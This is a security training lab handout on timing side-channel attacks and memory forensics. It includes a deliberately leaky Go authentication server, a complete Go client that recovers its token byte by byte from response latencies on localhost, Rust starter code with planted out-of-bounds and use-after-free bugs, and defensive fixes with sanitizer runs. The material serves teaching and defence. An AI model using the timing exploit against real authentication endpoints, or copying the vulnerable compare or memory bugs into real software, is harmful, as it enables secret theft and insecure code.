# Week 34: Hands-On Lab Exercise - Exploiting Microarchitectural Timing Leaks & Memory Forensics

## Lab Overview & Mission Briefing
In this lab, you and your engineering team will act as both security penetration testers and systems defense architects. Your organization operates a high-throughput internal payment authentication microservice. A recent compliance audit flagged two critical architectural risks:
1. The token validation logic uses standard equality comparisons, potentially leaking authentication keys via microarchitectural timing side-channels.
2. Cryptographic secrets remain resident in virtual memory indefinitely, creating exposure to heap inspection vulnerabilities and persistent kernel page swapping to disk.

### Lab Schedule & Milestones
- **Day 1-2: Exploit Development (The Attack):** Stand up a vulnerable authentication server using short-circuit equality. Write an automated attacker exploit client that measures response latencies with microsecond/nanosecond resolution, filters jitter via statistical medians ($P_{50}$), and extracts a secret 16-character authorization token byte-by-byte.
- **Day 3-4: Defense & Dynamic Memory Forensics (The Hardening):** Study the complete Go reference implementation of constant-time verification and physical memory locking. Implement the hardened vault in Rust, navigating compiler optimizations, volatile memory zeroization, and OS page locking. Run AddressSanitizer (ASan) and Rust Miri to detect and fix heap buffer overflows and pointer provenance violations.
- **Friday: Mob Review & Benchmarking:** Execute CPU branch-miss benchmarks, audit assembly output, debate the 7 architectural defense questions, and complete the production sign-off checklist.

---

## Day 1-2: Exploit Development — The Timing Attack

### 1. The Vulnerable Server (`vulnerable_server.go`)
Create a new directory `lab_exploit` and save the following complete, runnable HTTP authentication service. The server validates a 16-character secret token (`P@ssw0rdSecure!!`). To ensure reliable demonstration across local network stacks, a micro-delay of 200 microseconds is injected per matched character, simulating the cumulative processing latency of complex verification chains.

```go
package main

import (
	"fmt"
	"net/http"
	"time"
)

// Secret authentication token to be exfiltrated byte-by-byte
const SecretToken = "P@ssw0rdSecure!!"

// LeakyTokenCompare checks the candidate token against the secret token.
// VULNERABILITY: It short-circuits immediately on the first mismatched byte,
// leaking the number of correctly guessed leading characters via response latency.
func LeakyTokenCompare(candidate, secret string) bool {
	if len(candidate) != len(secret) {
		return false
	}

	for i := 0; i < len(secret); i++ {
		// Simulating microarchitectural latency / pipeline depth
		// Each additional matched character adds measurable processing time.
		time.Sleep(200 * time.Microsecond)

		if candidate[i] != secret[i] {
			return false // EARLY EXIT: Timing side-channel created here!
		}
	}
	return true
}

func authHandler(w http.ResponseWriter, r *http.Request) {
	candidate := r.URL.Query().Get("token")
	if candidate == "" {
		http.Error(w, "Missing 'token' query parameter", http.StatusBadRequest)
		return
	}

	if LeakyTokenCompare(candidate, SecretToken) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("200 OK: Authenticated"))
	} else {
		http.Error(w, "401 Unauthorized: Invalid Token", http.StatusUnauthorized)
	}
}

func main() {
	http.HandleFunc("/api/v1/auth/verify", authHandler)
	fmt.Println("[+] Vulnerable Payment Gateway listening on http://127.0.0.1:8080")
	if err := http.ListenAndServe("127.0.0.1:8080", nil); err != nil {
		panic(err)
	}
}
```

### 2. The Attacker Exploit Client (`timing_exploit.go`)
Save the following automated exploit client. It iterates through each byte position (0 to 15), probes all printable ASCII characters ($32$ to $126$), records multiple latency samples per candidate, filters out operating system scheduling noise using median calculations ($P_{50}$), and identifies the candidate byte that produces the longest execution latency.

```go
package main

import (
	"fmt"
	"io"
	"net/http"
	"sort"
	"time"
)

const (
	TargetURL    = "http://127.0.0.1:8080/api/v1/auth/verify?token="
	TokenLength  = 16
	SamplesPerTry = 30 // Number of requests per candidate byte to filter jitter
)

// measureLatency executes an HTTP request and measures the round-trip duration.
func measureLatency(client *http.Client, candidate string) time.Duration {
	start := time.Now()
	resp, err := client.Get(TargetURL + candidate)
	if err != nil {
		return 0
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	_ = resp.Body.Close()
	return time.Since(start)
}

// getMedianLatency collects N samples and returns the P50 median latency.
// Median filtering rejects outliers caused by OS thread scheduling and network hiccups.
func getMedianLatency(client *http.Client, candidate string) time.Duration {
	durations := make([]time.Duration, SamplesPerTry)
	for i := 0; i < SamplesPerTry; i++ {
		durations[i] = measureLatency(client, candidate)
	}
	sort.Slice(durations, func(i, j int) bool {
		return durations[i] < durations[j]
	})
	return durations[SamplesPerTry/2] // Return P50 median
}

func main() {
	fmt.Println("=== [EXPLOIT] Initiating Byte-by-Byte Timing Attack ===")
	client := &http.Client{
		Timeout: 2 * time.Second,
		Transport: &http.Transport{
			MaxIdleConnsPerHost: 10,
			DisableKeepAlives:   false, // Keep connections alive to minimize TCP handshake jitter
		},
	}

	// Initialize candidate buffer with 16 placeholder bytes
	discoveredToken := []byte("0000000000000000")

	// Printable ASCII character set (range 32 to 126)
	charset := make([]byte, 0, 95)
	for c := byte(32); c <= byte(126); c++ {
		charset = append(charset, c)
	}

	for pos := 0; pos < TokenLength; pos++ {
		var bestChar byte
		var maxLatency time.Duration

		fmt.Printf("[*] Probing position %2d/16: ", pos)

		for _, charCandidate := range charset {
			discoveredToken[pos] = charCandidate
			medianDur := getMedianLatency(client, string(discoveredToken))

			if medianDur > maxLatency {
				maxLatency = medianDur
				bestChar = charCandidate
			}
		}

		discoveredToken[pos] = bestChar
		fmt.Printf("Locked Char: '%c' (P50: %v) -> Current Secret: %s\n",
			bestChar, maxLatency, string(discoveredToken))
	}

	fmt.Printf("\n[SUCCESS] Extracted Full Secret Token: %s\n", string(discoveredToken))
}
```

### 3. Execution & Verification
1. Terminal 1: Run the vulnerable server:
   ```bash
   go run vulnerable_server.go
   ```
2. Terminal 2: Execute the exploit:
   ```bash
   go run timing_exploit.go
   ```
Observe how the exploit steadily locks in `P`, `@`, `s`, `s`, `w`, `0`, `r`, `d`, `S`, `e`, `c`, `u`, `r`, `e`, `!`, `!` as the latency spikes linearly by ~200 µs with each successfully guessed character.

---

## Day 3-4: Defense & Dynamic Memory Forensics

### 1. Hardened Defense: Complete Go Reference Implementation
Create `hardened_server.go`. This server replaces the early-exit loop with `crypto/subtle.ConstantTimeCompare` and uses `syscall.Mlock` and `runtime.KeepAlive` for memory hygiene:

```go
package main

import (
	"crypto/subtle"
	"fmt"
	"net/http"
	"runtime"
	"sync"
	"syscall"
)

type SecureVault struct {
	mu     sync.RWMutex
	secret []byte
}

func NewSecureVault(token []byte) *SecureVault {
	buf := make([]byte, len(token))
	copy(buf, token)

	// Lock memory against kernel paging to swap space
	_ = syscall.Mlock(buf)

	return &SecureVault{secret: buf}
}

func (v *SecureVault) Verify(candidate []byte) bool {
	v.mu.RLock()
	defer v.mu.RUnlock()

	// Constant-time comparison: executes branchless bitwise XOR accumulator.
	// Latency remains strictly identical regardless of how many bytes match.
	match := subtle.ConstantTimeCompare(v.secret, candidate)
	return match == 1
}

func (v *SecureVault) Close() {
	v.mu.Lock()
	defer v.mu.Unlock()

	for i := range v.secret {
		v.secret[i] = 0
	}
	runtime.KeepAlive(v.secret) // Defeat Dead Store Elimination
	_ = syscall.Munlock(v.secret)
	v.secret = nil
}

func main() {
	vault := NewSecureVault([]byte("P@ssw0rdSecure!!"))
	defer vault.Close()

	http.HandleFunc("/api/v1/auth/verify", func(w http.ResponseWriter, r *http.Request) {
		candidate := []byte(r.URL.Query().Get("token"))
		if vault.Verify(candidate) {
			w.WriteHeader(http.StatusOK)
			_, _ = w.Write([]byte("200 OK: Authenticated"))
		} else {
			http.Error(w, "401 Unauthorized", http.StatusUnauthorized)
		}
	})

	fmt.Println("[+] Hardened Payment Gateway listening on http://127.0.0.1:8080")
	_ = http.ListenAndServe("127.0.0.1:8080", nil)
}
```
*Run the timing exploit against `hardened_server.go`. Notice that the exploit fails completely: all character guesses produce statistically indistinguishable latencies.*

---

### 2. Rust Starter Skeleton: Memory Sanitizers & Forensics (Your Task)
In this exercise, you will implement a hardened memory holder in Rust. We have provided starter code with deliberate memory safety vulnerabilities in an unsafe FFI helper module.

#### The 3 Specific Rust Concepts You Will Fight
1. **Concept 1: Defeating Dead Store Elimination with Volatile Writes.**
   In Rust, implementing `Drop` and setting `*ptr = 0` will be deleted by LLVM's DSE pass because the memory is freed right after. You must write bytes using `std::ptr::write_volatile` and issue an explicit atomic compiler barrier (`compiler_fence(Ordering::SeqCst)`).
2. **Concept 2: Pointer Provenance & Stacked Borrows.**
   When wrapping raw allocations (`NonNull<u8>`), turning them into slices via `std::slice::from_raw_parts` requires adhering to strict aliasing rules. If you create a mutable slice while an immutable slice exists, or access a pointer outside its allocated allocation block, Miri will flag a **Stacked Borrows violation**.
3. **Concept 3: Avoiding Branch Invocations with `subtle::Choice`.**
   Do not convert `Choice` to `bool` inside loops or intermediate evaluation steps. A `bool` can be lowered to a conditional branch (`jne`) by LLVM, reintroducing timing side-channels. Keep results encapsulated in `Choice` until the absolute external API boundary.

#### Starter Code with Deliberate Forensic Bugs (`src/lib.rs`):

```rust
use std::ptr::NonNull;
use std::sync::atomic::{compiler_fence, Ordering};
use subtle::{Choice, ConstantTimeEq};

pub struct HardenedSecret {
    ptr: NonNull<u8>,
    len: usize,
}

unsafe impl Send for HardenedSecret {}
unsafe impl Sync for HardenedSecret {}

impl HardenedSecret {
    pub fn new(secret: &[u8]) -> Self {
        assert!(!secret.is_empty(), "Secret cannot be empty");
        let len = secret.len();

        unsafe {
            // Allocate heap buffer via libc
            let raw = libc::malloc(len) as *mut u8;
            assert!(!raw.is_null(), "malloc failed");

            // TODO (Team Task): Call libc::mlock to pin the physical memory in RAM
            // libc::mlock(raw as *const libc::c_void, len);

            std::ptr::copy_nonoverlapping(secret.as_ptr(), raw, len);
            Self {
                ptr: NonNull::new_unchecked(raw),
                len,
            }
        }
    }

    pub fn verify(&self, candidate: &[u8]) -> bool {
        if candidate.len() != self.len {
            return false;
        }

        let slice = unsafe { std::slice::from_raw_parts(self.ptr.as_ptr(), self.len) };
        let choice: Choice = slice.ct_eq(candidate);
        choice.into()
    }
}

impl Drop for HardenedSecret {
    fn drop(&mut self) {
        unsafe {
            // TODO (Team Task): Implement volatile zeroization to defeat Dead Store Elimination.
            // Replace the following naive zeroing with std::ptr::write_volatile:
            let raw = self.ptr.as_ptr();
            for i in 0..self.len {
                *raw.add(i) = 0; // BUG: LLVM optimizes this away! Fix with write_volatile!
            }
            compiler_fence(Ordering::SeqCst);

            libc::free(self.ptr.as_ptr() as *mut libc::c_void);
        }
    }
}

// ============================================================================
// FORENSIC BUG LAB: Deliberate memory corruption bugs for ASan & Miri to catch!
// ============================================================================

/// BUG 1: Heap Out-Of-Bounds Read / Buffer Overrun
pub unsafe fn leaky_heap_probe(buf: &[u8]) -> u8 {
    let ptr = buf.as_ptr();
    // Deliberate off-by-one overrun: reads 1 byte past the allocated slice!
    *ptr.add(buf.len())
}

/// BUG 2: Heap Use-After-Free
pub unsafe fn use_after_free_trigger() -> u8 {
    let raw = libc::malloc(16) as *mut u8;
    *raw = 42;
    libc::free(raw as *mut libc::c_void);
    // Deliberate Use-After-Free: reading memory after freeing it!
    *raw
}
```

#### Step-by-Step Forensic Execution Instructions

##### 1. Running Rust Miri
Run Miri to evaluate the abstract machine for undefined behavior and provenance violations:
```bash
cargo +nightly miri test
```
**Expected Miri Diagnostic Output:**
```text
error: Undefined Behavior: memory access failed: pointer must be in-bounds at offset 16, but got 16 which is at or beyond the end of the allocation of size 16
   --> src/lib.rs:72:5
    |
 72 |     *ptr.add(buf.len())
    |     ^^^^^^^^^^^^^^^^^^^ memory access failed: pointer must be in-bounds
```

##### 2. Running AddressSanitizer (ASan)
Run AddressSanitizer to detect heap use-after-free and out-of-bounds reads in native machine code:
```bash
RUSTFLAGS="-Zsanitizer=address" cargo +nightly test --target x86_64-unknown-linux-gnu -- --nocapture
```
**Expected ASan Crash Report:**
```text
=================================================================
==18421==ERROR: AddressSanitizer: heap-use-after-free on address 0x602000000010
READ of size 1 at 0x602000000010 thread T0
    #0 0x55d78a in security_vault::use_after_free_trigger src/lib.rs:79:5
    #1 0x55da12 in security_vault::tests::test_uaf src/lib.rs:95:9
freed by thread T0 here:
    #0 0x7f43b1 in free (/lib/x86_64-linux-gnu/libasan.so.6+0xb1)
    #1 0x55d775 in security_vault::use_after_free_trigger src/lib.rs:77:5
previously allocated by thread T0 here:
    #0 0x7f43f8 in malloc (/lib/x86_64-linux-gnu/libasan.so.6+0xf8)
    #1 0x55d762 in security_vault::use_after_free_trigger src/lib.rs:75:15
Shadow bytes around the buggy address:
  0x1c0400000000: fa fa 00 00 fa fa fd fd fa fa fa fa fa fa fa fa
=>0x1c0400000010:[fd]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend: 0x00=addressable, 0xfa=heap redzone, 0xfd=heap freed memory
=================================================================
```
*Notice how shadow byte `0xfd` flags heap freed memory, causing AddressSanitizer to immediately halt the process.*

---

## Friday: Mob Review & Benchmarking

### 1. Performance vs Security Benchmark Matrix
Run the standard Go and Rust microbenchmarks to measure execution overhead:
```bash
# Go benchmark
go test -bench=. -benchmem

# Rust benchmark
cargo bench
```

Fill in the benchmark table with your team's hardware measurements:

| Test Case | Branch Misses (`perf stat`) | P50 Latency | P99 Latency | Allocations/op | Timing Leak? |
| :--- | :--- | :--- | :--- | :--- | :--- |
| Early-Exit String Compare (`==`) | Variable (High) | ~15 ns (mismatch 0) | ~95 ns (mismatch 15) | 0 B | **CRITICAL LEAK** |
| Go `crypto/subtle.ConstantTimeCompare` | 0 (Branchless) | ~24 ns (Invariant) | ~26 ns (Invariant) | 0 B | **IMMUNE** |
| Rust `subtle::ConstantTimeEq` | 0 (Branchless) | ~18 ns (Invariant) | ~19 ns (Invariant) | 0 B | **IMMUNE** |
| Rust `write_volatile` Zeroize on Drop | N/A | ~8 ns | ~10 ns | 0 B | **CLEARED** |

---

### 2. 7 Technical Discussion Questions with Authoritative Answers

#### Q1: Why does network jitter not protect an application from remote timing attacks?
**Answer:** Network jitter behaves as random (often Gaussian or right-skewed) noise. According to the central limit theorem, the standard error of the mean diminishes proportionally to $\frac{1}{\sqrt{N}}$. By taking thousands of measurements and computing the median ($P_{50}$), an attacker averages out transmission jitter, isolating the internal CPU processing delta ($\Delta t \approx 20\text{--}200\text{ ns}$) with statistical certainty.

#### Q2: What is Dead Store Elimination (DSE) and why is it dangerous in cryptographic software?
**Answer:** DSE is an optimization pass where the compiler eliminates memory writes to variables that will not be read again before deallocation. If you write `memset(secret, 0, len)` right before freeing the buffer, the compiler's data-flow analysis proves the zeroes are never read, and deletes the zeroing loop. As a result, plaintext keys remain in RAM indefinitely.

#### Q3: Why is `NativeMemory.Alloc` preferred over managed `byte[]` arrays for sensitive keys in C#?
**Answer:** The .NET Garbage Collector can relocate objects during heap compaction. When the GC moves an active `byte[]`, it copies the bytes to a new heap address without zeroing out the old location, leaving "ghost copies" of the plaintext secret in dead Gen 0/1 memory. Allocating unmanaged memory via `NativeMemory.Alloc` bypasses the GC, providing stable physical memory that can be zeroized deterministically.

#### Q4: How does AddressSanitizer's shadow memory architecture detect a 1-byte buffer overrun?
**Answer:** ASan maps every 8 bytes of application memory to 1 shadow byte ($1/8$th scale). It inserts poisoned "redzones" (marked `0xFA` or `0xFB`) around allocations. When an access occurs, ASan translates the pointer to its shadow address using `(Addr >> 3) + Offset`. If the pointer overshoots into the redzone, the shadow byte is non-zero, and the check aborts execution with a full trace.

#### Q5: What is the fundamental difference between what AddressSanitizer detects and what Rust Miri detects?
**Answer:** ASan operates on native compiled machine code and detects physical memory boundary violations (heap overflows, use-after-free). Miri interprets Rust MIR in an abstract virtual machine and verifies formal semantic invariants (Stacked Borrows, pointer provenance, aliasing rules, and unaligned reads). Miri detects undefined behaviors that execute without crashing on x86 but violate the compiler's optimization contracts.

#### Q6: Why does `crypto/subtle.ConstantTimeCompare` return an `int` rather than a `bool` in Go?
**Answer:** Converting an integer to a `bool` can induce the Go compiler to generate conditional branch instructions (`TEST` followed by `JNZ`) in the caller's scope. Returning an `int` ($1$ or $0$) computed via branchless bit-shifts (`(uint32(x^y) - 1) >> 31`) encourages downstream code to perform branchless arithmetic or deferred validation.

#### Q7: How does OS page swapping compromise secrets, and how does `mlock` defend against it?
**Answer:** Under memory pressure, the OS paging daemon (`kswapd`) pushes anonymous memory pages to swap partitions on NVMe/SSD storage. Because modern flash controllers use wear leveling, deleting or unmounting swap does not erase physical flash cells, leaving keys recoverable via forensic NAND analysis. The `mlock` system call pins pages in physical RAM, legally forbidding the kernel from writing them to swap.

---

### 3. Sign-Off Checklist
Every team member must verify and check off each requirement before promoting code to production:

- [ ] **Timing Verification:** I have executed the timing attack script and confirmed that early-exit comparisons leak secret bytes, while `subtle` implementations produce flat latency profiles.
- [ ] **Dead Store Elimination Defense:** I have inspected the compiled assembly or verified that volatile memory writes (`write_volatile` / `CryptographicOperations.ZeroMemory`) are not eliminated by compiler optimization passes.
- [ ] **Physical Memory Pinning:** I have verified that cryptographic buffers are locked into physical RAM via `mlock` or `VirtualLock` to prevent persistent disk swapping.
- [ ] **Core Dump Exclusion:** I have confirmed that sensitive memory regions are flagged with `MADV_DONTDUMP` to prevent keys from leaking into crash reports.
- [ ] **ASan Validation:** I have compiled and run the test suite under AddressSanitizer (`-Zsanitizer=address`) with zero detected buffer overflows or use-after-free faults.
- [ ] **Miri Abstract Model Validation:** I have run `cargo miri test` and verified that all raw pointer manipulations comply with Rust's Stacked Borrows / Tree Borrows aliasing models.
- [ ] **Deterministic Destruction:** I have verified that secrets are wiped immediately upon disposal or scope exit using RAII (`Drop`) or explicit `IDisposable` patterns.

---

### 4. Stretch Goals for Fast Learners

1. **Constant-Time Hex/Base64 Transcoding:** Implement a constant-time hexadecimal or Base64 decoding algorithm without data-dependent table lookups (defeating cache-timing side-channels).
2. **Speculative Execution Hardening (Spectre Mitigation):** Implement an array bounds check that remains constant-time even under speculative CPU execution, using speculative load hardening barriers (`core::hint::black_box` or architecture-specific LFENCE instructions).
